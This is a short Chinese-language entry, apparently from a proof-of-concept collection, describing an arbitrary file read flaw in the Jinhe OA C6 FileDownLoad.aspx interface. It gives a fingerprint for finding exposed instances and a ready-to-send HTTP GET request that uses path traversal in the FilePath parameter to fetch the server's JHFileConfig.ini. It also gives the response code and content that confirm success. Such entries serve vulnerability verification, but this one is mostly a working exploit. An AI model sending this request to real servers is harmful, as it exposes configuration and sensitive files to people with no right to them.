﻿# 金和OA-C6-文件读取-FileDownLoad

> 更新时间：2024-05-14

> 漏洞编号：

> 漏洞说明： 金和OA FileDownLoad接口处存在任意文件读取漏洞，攻击者可以通过构造精心设计的请求，成功利用漏洞读取服务器上的任意文件，包括敏感系统文件和应用程序配置文件等。通过利用此漏洞，攻击者可能获得系统内的敏感信息，导致潜在的信息泄露风险。

> 漏洞特征： body="JHSoft.Web.AddMenu"

> 验证脚本：HTTP

```
GET /c6/JHSoft.Web.CustomQuery/FileDownLoad.aspx?FilePath=../Resource/JHFileConfig.ini HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
```

> 响应代码特征：200

> 响应内容特征：FolderTotal

> 上传文件定位：

> 验证文件来源：金和OA-C6-文件读取-FileDownLoad.poc

